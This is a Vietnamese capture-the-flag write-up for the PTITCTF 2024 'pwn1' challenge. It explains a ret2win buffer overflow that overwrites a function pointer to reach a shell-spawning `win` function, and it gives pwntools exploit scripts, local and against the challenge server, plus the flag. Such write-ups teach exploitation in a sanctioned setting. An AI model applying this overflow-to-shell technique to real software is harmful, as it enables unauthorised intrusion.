# pwn1
## Kịch bản
- Ta phải ghi đè lên biến `a` để control hàm `ptr_func`
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-1.png)
- Chúng ta thấy có hàm `win`, hàm này thực hiện chức năng lấy shell của server để thực hiện chương trình
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-2.png)

-> Ghi đè lên biến `a` để control hàm `ptr_func`, sau đó ghi đè lên địa chỉ hàm `hello` để trỏ về hàm `win`
## Solution
- Check bảo mật của file, ta thấy có dòng `No PIE` tức là địa chỉ giữ nguyên không bị thay đổi -> Có thể tính toán offset 1 cách dễ dàng
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-3.png)
- Ghi đè biến `buffer` lên biến `a`

![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-4.png)
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-5.png)

`0x004040F0 - 0x00404060 = 0x90`
-> Ghi đè `144 - 8 (0xDEADBEEF) = 136` bytes + 8 bytes của `0xDEADBEEF`
- Thay thế địa chỉ hàm `ptr_func` để trỏ đến địa chỉ hàm `win`
- Lấy địa chỉ hàm `win` để lấy shell của chương trình
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-6.png)
- Viết code lấy shell chương trình
```Python
from pwn import *

p = process("./pwn1")

#Ghi đè
payload = b"a"*136
payload += p64(0xDEADBEEF)
win = 0x000000000040130c #dia chi ham win
payload += p64(win)

p.sendlineafter(b"Enter your name:", payload)
p.interactive()
```
- Lúc này chúng ta đã lấy được shell của chương trình, tức là đã ghi đè thành công và control được địa chỉ của hàm `ptr_func`
![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-7.png)
- Tiến hành remote lên server
```Python
from pwn import *

#p = process("./pwn1")
p = remote("14.225.255.41", 13331)

payload = b"a"*136
payload += p64(0xDEADBEEF) #chuyen chuoi hex sang 8 bytes

win = 0x000000000040130c
payload += p64(win)

p.sendlineafter(b"Enter your name: ", payload)
p.interactive()
```
## Flag
```PTITCTF{fl0w_fl0w_0v3rfl0w_g3t_w1n}```
## Kết luận
- Đây là dạng bài `ret2win` khá phổ biến trong mảng `pwnable`